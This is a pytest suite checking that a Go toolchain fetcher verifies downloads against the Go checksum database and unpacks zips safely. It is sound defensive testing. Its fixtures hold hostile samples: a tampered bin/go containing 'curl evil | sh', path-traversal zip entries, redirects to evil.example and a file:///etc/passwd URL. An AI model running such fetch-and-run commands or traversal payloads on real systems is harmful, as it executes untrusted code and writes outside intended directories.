"""The Go toolchain tundravm fetches when the host has no ``go``: checked as ``go`` checks it."""

from __future__ import annotations

import base64
import functools
import hashlib
import http.client
import io
import os
import re
import socket
import stat
import struct
import zipfile
import zlib
from collections.abc import Callable
from email.message import Message
from pathlib import Path
from typing import cast
from urllib.error import HTTPError, URLError
from urllib.request import Request

import pytest

from tundravm import _go_toolchain as go
from tundravm.errors import SourceError
from tundravm.project import host_cache

NAME = "go1.25.0"
MODULE = f"golang.org/toolchain@v0.0.1-{NAME}.linux-amd64"
PATH, VERSION = MODULE.split("@")
FILES = {"bin/go": b"#!/bin/sh\n", "pkg/tool/linux_amd64/compile": b"c", "VERSION": b"go1.25.0"}
SEED = b"\x07" * 32


def _zip(files: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        for rel, data in files.items():
            archive.writestr(f"{MODULE}/{rel}", data)
    return out.getvalue()


def _h1(files: dict[str, bytes]) -> str:
    """``dirhash.Hash1`` over the module zip's file list, written out."""
    lines = sorted(f"{MODULE}/{rel}" for rel in files)
    summary = "".join(
        f"{hashlib.sha256(files[name.removeprefix(MODULE + '/')]).hexdigest()}  {name}\n"
        for name in lines
    )
    return "h1:" + base64.b64encode(hashlib.sha256(summary.encode()).digest()).decode()


def _int(data: bytes) -> int:
    return int.from_bytes(data, "little")


def _sign(seed: bytes, message: bytes) -> tuple[bytes, bytes]:
    """``(public, signature)``: RFC 8032 Ed25519 with the private key *seed*."""
    h = hashlib.sha512(seed).digest()
    a = (_int(h[:32]) & ((1 << 254) - 8)) | (1 << 254)
    public = go.point_compress(go.point_mul(a, go.BASE))
    r = _int(hashlib.sha512(h[32:] + message).digest()) % go._L
    big_r = go.point_compress(go.point_mul(r, go.BASE))
    k = _int(hashlib.sha512(big_r + public + message).digest()) % go._L
    return public, big_r + ((r + k * a) % go._L).to_bytes(32, "little")


def _key(seed: bytes) -> str:
    public, _ = _sign(seed, b"")
    key = b"\x01" + public
    key_id = hashlib.sha256(b"sum.golang.org\n" + key).digest()[:4].hex()
    return f"sum.golang.org+{key_id}+{base64.b64encode(key).decode()}"


def _mth(leaves: list[bytes]) -> bytes:
    if len(leaves) == 1:
        return leaves[0]
    half = 1 << ((len(leaves) - 1).bit_length() - 1)
    return hashlib.sha256(b"\x01" + _mth(leaves[:half]) + _mth(leaves[half:])).digest()


def _record(h1: str, version: str = VERSION) -> bytes:
    return f"{PATH} {version} {h1}\n{PATH} {version}/go.mod h1:mod=\n".encode()


def _note(text: bytes, *signers: bytes) -> bytes:
    """*text* signed by each of *signers* (seeds) as ``sum.golang.org``."""
    lines = b""
    for seed in signers:
        _, signature = _sign(seed, text)
        key_id = bytes.fromhex(_key(seed).split("+")[1])
        lines += b"\xe2\x80\x94 sum.golang.org " + base64.b64encode(key_id + signature) + b"\n"
    return text + b"\n" + lines


def _tree_text(size: int, root: bytes) -> bytes:
    return f"go.sum database tree\n{size}\n{base64.b64encode(root).decode()}\n".encode()


OTHER = "v0.0.1-go1.24.0.linux-amd64"


def _served(
    files: dict[str, bytes],
    *,
    signer: bytes = SEED,
    claimed: dict[str, bytes] | None = None,
    answer: int = 1,
    second: bytes | None = None,
    head: bytes | None = None,
) -> dict[str, bytes]:
    """The proxy serving *files* and a checksum database of three records whose second is
    :data:`FILES`'s (or *second*) and third another release's, its head signed by *signer*;
    the lookup answers record *answer* (as *head*), with *claimed*'s hash in place of the
    second's."""
    ours = _record(_h1(FILES)) if second is None else second
    records = [b"example.com/a v1.0.0 h1:a=\n", ours, _record("h1:o=", OTHER)]
    leaves = [hashlib.sha256(b"\x00" + text).digest() for text in records]
    note = _note(_tree_text(3, _mth(leaves)), signer)
    text = records[answer] if claimed is None else _record(_h1(claimed))
    index = f"{answer}".encode() if head is None else head
    return {
        f"{go.SUMDB}/lookup/{MODULE}": index + b"\n" + text + b"\n" + note,
        f"{go.SUMDB}/tile/8/0/000.p/3": b"".join(leaves),
        f"{go.GO_PROXY}/{PATH}/@v/{VERSION}.zip": _zip(files),
    }


def _fetcher(served: dict[str, bytes], asked: list[str] | None = None) -> go.Fetcher:
    """*served*'s body at each url, 404 elsewhere; unreachable when *served* is empty."""

    def fetch(url: str) -> bytes:
        if asked is not None:
            asked.append(url)
        if not served:
            raise URLError("no route to host")
        if url not in served:
            raise HTTPError(url, 404, "Not Found", Message(), None)
        return served[url]

    return fetch


TAMPERED = {**FILES, "bin/go": b"#!/bin/sh\ncurl evil | sh\n"}


@pytest.mark.parametrize(
    ("served", "refused"),
    [
        (_served(FILES), None),
        (_served(TAMPERED), "the zip hashes to h1:"),
        (_served(FILES, signer=b"\x09" * 32), "0 signatures by sum.golang.org, not one"),
        (_served(TAMPERED, claimed=TAMPERED), "record is not the one its signed tree holds"),
        (_served(FILES, answer=0), f"record names no hash of {MODULE}"),
        (_served(FILES, answer=2), f"record names no hash of {MODULE}"),
        (
            _served(FILES, second=_record(_h1(FILES)) + _record(_h1(TAMPERED))[:96] + b"\n"),
            f"names {MODULE} other than once",
        ),
        (_served(FILES, head=b"01"), "answer is not a record"),
        (_served(FILES, head=b"1 "), "answer is not a record"),
        ({}, "cannot download it: no route to host"),
    ],
    ids=[
        "verified",
        "hash-mismatch",
        "bad-signature",
        "record-not-in-tree",
        "other-module",
        "other-version",
        "two-hashes",
        "index-leading-zero",
        "index-not-decimal",
        "unreachable",
    ],
)
def test_a_fetched_go_runs_only_once_the_checksum_database_vouches_for_it(
    monkeypatch: pytest.MonkeyPatch, served: dict[str, bytes], refused: str | None
) -> None:
    """The proxy's zip must hash to the record the database's signed tree holds; anything
    else is refused with the fix and leaves nothing behind."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    asked: list[str] = []

    fetcher = _fetcher(served, asked)
    root = go.toolchains_dir() / NAME
    if refused is not None:
        with pytest.raises(SourceError, match=refused) as failed:
            go.fetch_go(NAME, fetcher=fetcher)
        assert "sudo apt install golang" in str(failed.value.hint)
        assert "proxy.golang.org" in str(failed.value.hint)
        assert not go.toolchains_dir().exists() or not any(go.toolchains_dir().iterdir())
        return
    assert go.fetch_go(NAME, fetcher=fetcher) == root
    assert (root / "bin" / "go").read_bytes() == FILES["bin/go"]
    assert (root / "bin" / "go").stat().st_mode & 0o111
    assert (root / "pkg/tool/linux_amd64/compile").stat().st_mode & 0o111
    assert not (root / "VERSION").stat().st_mode & 0o111
    assert (root / go.VERIFIED).read_text(encoding="utf-8") == f"{MODULE} {_h1(FILES)}\n"
    fetched = len(asked)
    assert go.fetch_go(NAME, fetcher=fetcher) == root and len(asked) == fetched


ROOT = bytes(range(32))
HEAD = _tree_text(3, ROOT)
WITNESS = b"\xe2\x80\x94 witness.example " + base64.b64encode(b"\x00" * 68) + b"\n"
FORGED = b"\xe2\x80\x94 sum.golang.org " + base64.b64encode(
    bytes.fromhex(_key(SEED).split("+")[1]) + b"\x00" * 64
)


@pytest.mark.parametrize(
    ("note", "refused"),
    [
        (_note(HEAD, SEED), None),
        (_note(HEAD, SEED) + WITNESS, None),
        (_note(HEAD + b"extra\n", SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n\n3\n"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"go.sum", b"go.mod"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n03\n"), SEED), "signed note is not a tree head"),
        (_note(HEAD.replace(b"\n3\n", b"\n+3\n"), SEED), "signed note is not a tree head"),
        (_note(_tree_text(3, ROOT[:31]), SEED), "tree head holds no hash"),
        (_note(HEAD, b"\x09" * 32), "0 signatures by sum.golang.org, not one"),
        (_note(HEAD, SEED, SEED), "2 signatures by sum.golang.org, not one"),
        (_note(HEAD) + FORGED + b"\n" + _note(HEAD, SEED)[len(HEAD) + 1 :], "invalid signature"),
        (_note(HEAD, SEED) + b"hello\n", "a line that is no signature"),
        (_note(HEAD, SEED).replace(b"org ", b"org !"), "a line that is no signature"),
        (_note(HEAD, SEED)[:-1], "is not a signed note"),
        (HEAD + _note(HEAD, SEED)[len(HEAD) + 1 :], "is not a signed note"),
        (_note(HEAD.replace(b"tree\n", b"tree\r\n"), SEED), "is not a signed note"),
        (_note(HEAD, SEED) + b"\xff\n", "is not UTF-8"),
    ],
    ids=[
        "tree-head",
        "witness-cosigned",
        "extra-line",
        "blank-line-in-text",
        "wrong-origin",
        "size-leading-zero",
        "size-signed",
        "short-hash",
        "foreign-key",
        "signed-twice",
        "invalid-then-valid",
        "stray-line",
        "base64-garbage",
        "no-final-newline",
        "no-blank-line",
        "control-character",
        "not-utf8",
    ],
)
def test_a_tree_head_is_a_note_signed_once_by_the_database_key(
    monkeypatch: pytest.MonkeyPatch, note: bytes, refused: str | None
) -> None:
    """``note.Open`` then ``tlog.ParseTree``, strict: exactly one valid signature by the key,
    a text of exactly the three tree-head lines; a witness's line is ignored."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    if refused is None:
        assert go._signed_tree(note) == (3, ROOT)
        return
    with pytest.raises(go._Refused, match=refused):
        go._signed_tree(note)


def test_the_built_in_key_is_the_verifier_key_go_has() -> None:
    name, key_hash, public = go._verifier()
    assert (name, key_hash.hex(), len(public)) == (b"sum.golang.org", "033de0ae", 32)
    assert go._decompress(public) is not None


@functools.cache
def _log(size: int) -> tuple[list[bytes], bytes, dict[str, bytes]]:
    """``(leaves, root, tiles)`` of a log of *size* records, its tiles built bottom up as a
    tile server stores them: level ``8 * t`` hashes, 256 a tile, the last one partial."""
    leaves = [hashlib.sha256(b"\x00record %d\n" % n).digest() for n in range(size)]
    levels = [leaves]
    while len(levels[-1]) > 1:
        below = levels[-1]
        levels.append([_node(below[i], below[i + 1]) for i in range(0, len(below) - 1, 2)])
    tiles: dict[str, bytes] = {}
    for tile_level in range(0, len(levels), 8):
        stored = levels[tile_level]
        for n in range(0, len(stored), 256):
            row = stored[n : n + 256]
            path = f"{go.SUMDB}/tile/8/{tile_level // 8}/{go._tile_index(n // 256)}"
            tiles[path if len(row) == 256 else f"{path}.p/{len(row)}"] = b"".join(row)
    return leaves, _mth(leaves), tiles


def _node(left: bytes, right: bytes) -> bytes:
    return hashlib.sha256(b"\x01" + left + right).digest()


@pytest.mark.parametrize(
    ("size", "index"),
    [
        (1, 0),
        (2, 1),
        (3, 2),
        (255, 254),
        (256, 0),
        (256, 255),
        (257, 256),
        (300, 128),
        (513, 511),
        (70000, 0),
        (70000, 65535),
        (70000, 65536),
        (70000, 69999),
    ],
)
def test_a_record_is_proven_in_the_tree_from_the_tiles(size: int, index: int) -> None:
    """The record's leaf and the tiles' hashes recompute the signed root, at every tile
    level and partial width; a wrong level, tile number or offset would not."""
    leaves, root, tiles = _log(size)

    def fetcher(url: str) -> bytes:
        if url not in tiles:
            raise HTTPError(url, 404, "Not Found", Message(), None)
        return tiles[url]

    assert go._tree_hash(size, index, leaves[index], go._TileReader(size, fetcher)) == root
    wrong = hashlib.sha256(b"\x00another record\n").digest()
    assert go._tree_hash(size, index, wrong, go._TileReader(size, fetcher)) != root


@pytest.mark.parametrize(
    ("n", "path"),
    [(0, "000"), (7, "007"), (999, "999"), (1000, "x001/000"), (1234067, "x001/x234/067")],
)
def test_a_tile_number_is_spelled_as_tlog_spells_it(n: int, path: str) -> None:
    assert go._tile_index(n) == path


Entry = tuple[bytes, bytes, int, int]
"""``(name, data, mode, method)`` of a zip entry, the name as raw bytes."""


def _entry(rel: str | bytes, data: bytes = b"x", mode: int = 0o644, method: int = 0) -> Entry:
    name = rel if isinstance(rel, bytes) else f"{MODULE}/{rel}".encode()
    return name, data, mode, method


def _raw_zip(entries: list[Entry]) -> bytes:
    """A zip written byte by byte, so names, modes and methods are exactly *entries*'
    (``zipfile`` would mark a non-ASCII name UTF-8 and refuse to write a duplicate)."""
    out, central = bytearray(), bytearray()
    for name, data, mode, method in entries:
        crc, offset = zlib.crc32(data), len(out)
        sizes = (crc, len(data), len(data), len(name))
        out += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0, method, 0, 0, *sizes, 0)
        out += name + data
        central += struct.pack(
            "<IHHHHHHIIIHHHHHII",
            *(0x02014B50, 0x0314, 20, 0, method, 0, 0, *sizes, 0, 0, 0, 0, mode << 16, offset),
        )
        central += name
    count = len(entries)
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, count, count, len(central), len(out), 0)
    return bytes(out + central + end)


def _raw_h1(entries: list[Entry]) -> str:
    """``dirhash.Hash1`` of *entries*, over their names' bytes as Go's ``archive/zip`` has them."""
    lines = b"".join(
        hashlib.sha256(data).hexdigest().encode() + b"  " + name + b"\n"
        for name, data, _, _ in sorted(entries)
    )
    return "h1:" + base64.b64encode(hashlib.sha256(lines).digest()).decode()


def _zip_url() -> str:
    return f"{go.GO_PROXY}/{PATH}/@v/{VERSION}.zip"


GO = _entry("bin/go", b"#!/bin/sh\n", 0o755)
LINK = 0o120777
SETUID = 0o104755


@pytest.mark.parametrize(
    ("entries", "refused"),
    [
        ([GO, _entry(f"{MODULE}/test/".encode() + b"\xc3\x84foo.go")], None),
        ([_entry("bin/go", b"#!/bin/sh\n", SETUID), _entry("pkg/tool/x", b"t", 0o6777)], None),
        ([_entry("bin/go", b"/usr/bin/sh", LINK)], None),
        ([GO, _entry("../evil")], "outside golang.org/toolchain"),
        ([GO, _entry(b"/etc/evil")], "outside golang.org/toolchain"),
        ([GO, _entry(MODULE.replace(NAME, "go1.24.0").encode() + b"/bin/go")], "outside"),
        ([GO, _entry("./VERSION")], "outside golang.org/toolchain"),
        ([GO, _entry("bin/")], "outside golang.org/toolchain"),
        ([GO, _entry("bin/go")], "names b'golang.org/toolchain@.*/bin/go' twice"),
        ([GO, _entry("bad\nname")], "names a file"),
        ([GO, _entry("bad\0name")], "names a file"),
        ([GO, _entry("VERSION", method=12)], "compressed as go cannot read"),
        ([GO, _entry("bin/go/x")], "cannot unpack it into"),
        ([_entry("VERSION")], "the zip holds no bin/go"),
        ([GO, _entry("VERSION", b"y" * 600)], "unpacks to more than 0 MiB"),
    ],
    ids=[
        "raw-name",
        "setuid",
        "symlink",
        "traversal",
        "absolute",
        "other-module",
        "dot",
        "directory",
        "duplicate",
        "newline",
        "nul",
        "bzip2",
        "file-under-file",
        "no-go",
        "too-big",
    ],
)
def test_a_vouched_zip_unpacks_only_into_its_release_with_plain_modes(
    monkeypatch: pytest.MonkeyPatch, entries: list[Entry], refused: str | None
) -> None:
    """Even a zip the checksum database vouched for writes nothing outside the release and
    no link, setuid bit or mode it names; the dirhash reads names as Go's raw bytes."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    monkeypatch.setattr(go, "_UNZIPPED_LIMIT", 512)
    served = {**_served(FILES, second=_record(_raw_h1(entries))), _zip_url(): _raw_zip(entries)}
    root = go.toolchains_dir() / NAME
    if refused is not None:
        with pytest.raises(SourceError, match=refused):
            go.fetch_go(NAME, fetcher=_fetcher(served))
        assert not any(go.toolchains_dir().iterdir())
        return
    assert go.fetch_go(NAME, fetcher=_fetcher(served)) == root
    for name, data, _, _ in entries:
        path = root / os.fsdecode(name.removeprefix(f"{MODULE}/".encode()))
        assert stat.S_ISREG(path.lstat().st_mode) and path.read_bytes() == data
        command = path.is_relative_to(root / "bin") or path.is_relative_to(root / "pkg/tool")
        assert stat.S_IMODE(path.lstat().st_mode) == (0o755 if command else 0o644)
    assert sorted(p.name for p in go.toolchains_dir().iterdir()) == [NAME]


def _plant(root: Path, marker: str | None, *, link: bool, mode: int) -> None:
    """A *root* as an earlier run, a crash or another program could have left it."""
    target = root.with_name(".elsewhere") if link else root
    (target / "bin").mkdir(parents=True)
    (target / "bin" / "go").write_bytes(b"#!/bin/sh\necho planted\n")
    if marker is not None:
        (target / go.VERIFIED).write_text(marker, encoding="utf-8")
    target.chmod(mode)
    if link:
        root.symlink_to(target)


@pytest.mark.parametrize(
    ("marker", "link", "mode", "kept"),
    [
        (f"{MODULE} {_h1(FILES)}\n", False, 0o755, True),
        (None, False, 0o755, False),
        (f"{_h1(FILES)}\n", False, 0o755, False),
        (f"{MODULE.replace('amd64', 'arm64')} {_h1(FILES)}\n", False, 0o755, False),
        (f"{MODULE} sha256:x\n", False, 0o755, False),
        (f"{MODULE} {_h1(FILES)}\n", True, 0o755, False),
        (f"{MODULE} {_h1(FILES)}\n", False, 0o757, False),
    ],
    ids=["verified", "half-copy", "old-marker", "other-arch", "bad-hash", "link", "writable"],
)
def test_a_cached_release_runs_again_only_with_its_marker(
    monkeypatch: pytest.MonkeyPatch, marker: str | None, link: bool, mode: int, kept: bool
) -> None:
    """A release in the cache is used without the network only when its marker names this
    module and a hash, in a plain directory no one else can write; anything else there is
    moved aside and the release fetched again."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    root = go.toolchains_dir() / NAME
    _plant(root, marker, link=link, mode=mode)
    asked: list[str] = []
    assert go.fetch_go(NAME, fetcher=_fetcher(_served(FILES), asked)) == root
    assert (asked == []) is kept
    assert ((root / "bin" / "go").read_bytes() == FILES["bin/go"]) is not kept
    assert not root.is_symlink()
    if link:
        assert (root.with_name(".elsewhere") / "bin" / "go").is_file()


def test_a_toolchains_directory_others_can_write_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    directory = go.toolchains_dir()
    directory.mkdir(parents=True)
    directory.chmod(0o777)
    with pytest.raises(SourceError, match="others can write it") as failed:
        go.fetch_go(NAME, fetcher=_fetcher({}))
    assert f"Remove {directory}" in str(failed.value.hint)


class _Socket:
    """What ``http.client.HTTPResponse`` reads a raw answer from."""

    def __init__(self, raw: bytes) -> None:
        self.raw = raw

    def makefile(self, mode: str) -> io.BytesIO:
        return io.BytesIO(self.raw)


def _answer(head: str, body: bytes) -> http.client.HTTPResponse:
    response = http.client.HTTPResponse(cast(socket.socket, _Socket(head.encode() + body)))
    response.begin()
    return response


def _clock(step: float) -> Callable[[], float]:
    """A ``monotonic`` advancing *step* seconds each time it is read."""
    now = [0.0]

    def monotonic() -> float:
        now[0] += step
        return now[0]

    return monotonic


OK = "HTTP/1.1 200 OK\r\n"
CHUNKED = "Transfer-Encoding: chunked\r\n\r\n"


@pytest.mark.parametrize(
    ("head", "body", "step", "outcome"),
    [
        (f"{OK}Content-Length: 5\r\n\r\n", b"hello", 0.0, b"hello"),
        (f"{OK}Content-Length: 2000000\r\n\r\n", b"x", 0.0, "answers 2000000 bytes"),
        ("HTTP/1.0 200 OK\r\n\r\n", b"x" * (1 << 20) + b"x", 0.0, "more than 1 MiB"),
        (OK + CHUNKED, b"100001\r\n" + b"x" * 0x100001 + b"\r\n0\r\n\r\n", 0.0, "more than"),
        (f"{OK}Content-Length: 10\r\n\r\n", b"hello", 0.0, "5 bytes short"),
        (f"{OK}Content-Length: 5\r\n\r\n", b"hello", 61.0, "took more than 60 s"),
    ],
    ids=["within", "declared-too-big", "sent-too-big", "chunked-too-big", "cut-short", "slow"],
)
def test_an_answer_is_read_within_its_size_and_time(
    monkeypatch: pytest.MonkeyPatch, head: str, body: bytes, step: float, outcome: bytes | str
) -> None:
    """A lookup or tile is refused past 1 MiB, declared or sent; one cut short or taking
    longer than its deadline is a network failure."""
    monkeypatch.setattr(go, "monotonic", _clock(step))
    response = _answer(head, body)
    if isinstance(outcome, bytes):
        assert go._read(response, "sum.golang.org", go._TEXT_LIMIT, go._TEXT_SECONDS) == outcome
        return
    with pytest.raises((go._Refused, OSError), match=outcome):
        go._read(response, "sum.golang.org", go._TEXT_LIMIT, go._TEXT_SECONDS)


@pytest.mark.parametrize(
    "url",
    [
        f"http://proxy.golang.org/{PATH}/@v/{VERSION}.zip",
        "https://proxy.golang.org.example.com/x",
        "https://example.com/lookup/x",
        "file:///etc/passwd",
    ],
    ids=["plain-http", "lookalike-host", "other-host", "file"],
)
def test_a_download_goes_only_to_the_proxy_and_the_database_over_https(url: str) -> None:
    with pytest.raises(go._Refused, match="is not on proxy.golang.org or sum.golang.org"):
        go._download(url)


@pytest.mark.parametrize(
    ("origin", "target", "followed"),
    [
        ("https://proxy.golang.org/m/@v/v.zip", "https://storage.googleapis.com/p/m.zip", True),
        ("https://proxy.golang.org/m/@v/v.zip", "https://proxy.golang.org/n/@v/v.zip", True),
        ("https://proxy.golang.org/m/@v/v.zip", "http://storage.googleapis.com/p/m.zip", False),
        ("https://proxy.golang.org/m/@v/v.zip", "https://evil.example/m.zip", False),
        ("https://sum.golang.org/lookup/m", "https://storage.googleapis.com/p/m", False),
        ("https://storage.googleapis.com/p/m.zip", "https://evil.example/m.zip", False),
    ],
    ids=["to-storage", "same-host", "to-plain-http", "to-other-host", "database", "chained"],
)
def test_a_redirect_is_followed_only_to_the_proxys_storage(
    origin: str, target: str, followed: bool
) -> None:
    """proxy.golang.org serves its zips from storage.googleapis.com; no other redirect is
    followed, and none over plain HTTP."""
    handler = go._Redirect()
    request = Request(origin)
    if followed:
        redirected = handler.redirect_request(
            request, io.BytesIO(), 302, "Found", http.client.HTTPMessage(), target
        )
        assert redirected is not None and redirected.full_url == target
        return
    with pytest.raises(go._Refused, match="which tundravm does not fetch from"):
        handler.redirect_request(
            request, io.BytesIO(), 302, "Found", http.client.HTTPMessage(), target
        )


@pytest.mark.parametrize(
    ("name", "system", "machine", "refused"),
    [
        (NAME, "Linux", "x86_64", None),
        ("go1.25rc1", "Linux", "AMD64", None),
        (
            NAME,
            "Linux",
            "aarch64",
            "only for linux/amd64, the platform it builds on, and this host is linux/aarch64",
        ),
        (NAME, "Darwin", "x86_64", "this host is darwin/x86_64"),
        ("../../bin", "Linux", "x86_64", "'../../bin' is not a Go release"),
        ("go1.25.0/../../x", "Linux", "x86_64", "is not a Go release"),
        ("go1.22", "Linux", "x86_64", "'go1.22' is not a Go release"),
        ("go1.021.0", "Linux", "x86_64", "'go1.021.0' is not a Go release"),
    ],
    ids=["amd64", "rc", "arm64", "darwin", "traversal", "suffix-traversal", "language", "zeros"],
)
def test_only_a_release_for_linux_amd64_is_fetched(
    monkeypatch: pytest.MonkeyPatch, name: str, system: str, machine: str, refused: str | None
) -> None:
    """The release name becomes a cache path and a proxy url, so only a release's shape
    passes; the build platform is linux/amd64, so no other host fetches its Go."""
    monkeypatch.setattr("platform.system", lambda: system)
    monkeypatch.setattr("platform.machine", lambda: machine)
    if refused is None:
        assert go.host_module(name) == f"{PATH}@v0.0.1-{name}.linux-amd64"
        return
    with pytest.raises(SourceError, match=re.escape(refused)) as failed:
        go.fetch_go(name, fetcher=_fetcher({}))
    assert "sudo apt install golang" in str(failed.value.hint) or "go.mod" in str(failed.value.hint)
    assert not go.toolchains_dir().exists()


@pytest.mark.parametrize(
    ("xdg", "cache"),
    [("/var/cache/me", "/var/cache/me/tundravm"), ("", None), ("relative/cache", None)],
    ids=["absolute", "empty", "relative"],
)
def test_the_host_cache_is_xdg_cache_home_when_absolute(
    monkeypatch: pytest.MonkeyPatch, xdg: str, cache: str | None
) -> None:
    monkeypatch.setenv("XDG_CACHE_HOME", xdg)
    expected = Path(cache) if cache else Path.home() / ".cache" / "tundravm"
    assert host_cache() == expected
    assert go.toolchains_dir() == expected / "toolchains"
